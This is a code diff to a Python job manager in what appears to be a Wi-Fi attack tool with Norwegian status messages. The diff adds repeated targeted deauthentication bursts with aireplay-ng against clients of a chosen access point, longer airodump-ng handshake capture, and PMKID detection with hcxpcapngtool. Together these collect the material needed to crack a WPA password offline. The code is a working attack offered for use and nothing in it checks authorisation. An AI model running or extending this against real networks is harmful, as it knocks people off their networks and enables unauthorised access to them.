@@ -63,9 +63,17 @@ class JobManager:
         return job
 
     def _capture(self, job: Job, channel: str, deauth: bool):
-        # one radio: the channel-hopping scanner must pause so the capture can
-        # stay locked on the target's channel (otherwise the handshake is missed)
+        # one radio: pause the channel-hopping scanner so the capture stays
+        # locked on the target channel (otherwise the handshake is missed)
         scanner_was_running = bool(self.scanner and self.scanner.running)
+        clients = []
+        if self.scanner:
+            try:
+                clients = [c["mac"] for c in self.scanner.read().get("clients", [])
+                           if c.get("bssid", "").upper() == job.bssid.upper()
+                           and ":" in c.get("mac", "")]
+            except Exception:
+                pass
         if scanner_was_running:
             self.scanner.stop()
         if channel:
@@ -76,41 +84,93 @@ class JobManager:
         prefix = os.path.join(d, "cap")
         cmd = ["airodump-ng", "--bssid", job.bssid, "-c", channel,
                "-w", prefix, "--output-format", "pcap", self.iface]
+        inject_note = ""
         try:
             proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
             self._procs[f"{job.bssid}:capture"] = proc
-            # optional deauth bursts to encourage a reconnect (needs injection)
-            if deauth:
-                for _ in range(3):
-                    time.sleep(4)
-                    subprocess.run(["aireplay-ng", "--deauth", "5", "-a",
-                                    job.bssid, self.iface],
-                                   stdout=subprocess.DEVNULL,
-                                   stderr=subprocess.DEVNULL, timeout=20)
-            # poll for a handshake in the growing cap
-            deadline = time.time() + 180
+            time.sleep(3)
+            deadline = time.time() + 240
+            round_no = 0
             while time.time() < deadline and proc.poll() is None:
+                # targeted deauth each round (to the associated client if known —
+                # far more effective than a broadcast, when the card can inject)
+                if deauth:
+                    inject_note = self._deauth(job.bssid, clients)
                 time.sleep(5)
                 cap = self._latest_cap(d)
                 if cap:
                     n = self._eapol_count(cap, job.bssid)
-                    job.message = f"fanger… EAPOL-rammer: {n}/4 (koble en enhet til nettet)"
-                if cap and self._has_handshake(cap, job.bssid):
-                    job.handshake = True
-                    job.cap_file = cap
-                    job.status = "handshake"
-                    job.message = "handshake captured"
-                    break
+                    pmkid = self._has_pmkid(cap)
+                    seen = len(clients)
+                    base = f"fanger… EAPOL: {n}/4"
+                    if pmkid:
+                        base += " · PMKID ✓"
+                    if seen == 0:
+                        base += " · ingen klient sett — koble telefonen til nettet"
+                    if inject_note:
+                        base += f" · {inject_note}"
+                    job.message = base
+                    if self._has_handshake(cap, job.bssid) or pmkid:
+                        job.handshake = True
+                        job.cap_file = cap
+                        job.status = "handshake"
+                        job.message = ("PMKID fanget" if pmkid else "håndtrykk fanget") + \
+                                      f" (EAPOL {n}/4)"
+                        break
+                round_no += 1
             if not job.handshake:
                 job.status = "done"
-                job.message = "stopped (no handshake — try passive wait or a USB injection adapter)"
+                why = "ingen håndtrykk"
+                if not clients:
+                    why += " — ingen enhet koblet til nettet mens vi fanget"
+                elif inject_note and "injection" in inject_note.lower():
+                    why += " — deauth injiseres ikke på dette kortet (MT7921-begrensning); prøv passiv fangst eller USB-adapter"
+                job.message = "stoppet: " + why
         except Exception as e:
             job.status = "failed"; job.message = str(e)
         finally:
             self._stop_proc(f"{job.bssid}:capture")
             if scanner_was_running and self.scanner and not self.scanner.running:
                 self.scanner.start()
+
+    def _deauth(self, bssid: str, clients: list[str]) -> str:
+        """Targeted deauth to each known client (broadcast if none). Returns a
+        short note if injection appears to be failing (common on mt76 cards)."""
+        note = ""
+        targets = clients or [None]
+        for cmac in targets:
+            cmd = ["aireplay-ng", "--deauth", "5", "-a", bssid]
+            if cmac:
+                cmd += ["-c", cmac]
+            cmd += [self.iface]
+            try:
+                r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
+                out = (r.stdout + r.stderr).lower()
+                if ("injection is not supported" in out or
+                        "couldn't inject" in out or "no such" in out):
+                    note = "deauth: injection feiler"
+            except Exception:
+                note = "deauth: feilet"
+        return note
+
+    @staticmethod
+    def _has_pmkid(cap: str) -> bool:
+        """PMKID present? Use hcxpcapngtool if available (most reliable)."""
+        try:
+            import shutil, tempfile, os as _os
+            if not shutil.which("hcxpcapngtool"):
+                return False
+            out = tempfile.mktemp(suffix=".22000")
+            subprocess.run(["hcxpcapngtool", "-o", out, cap],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+                           timeout=30)
+            has = _os.path.exists(out) and _os.path.getsize(out) > 0
+            if _os.path.exists(out):
+                _os.remove(out)
+            return has
+        except Exception:
+            return False
 
     def stop_capture(self, bssid: str):
         self._stop_proc(f"{bssid}:capture")
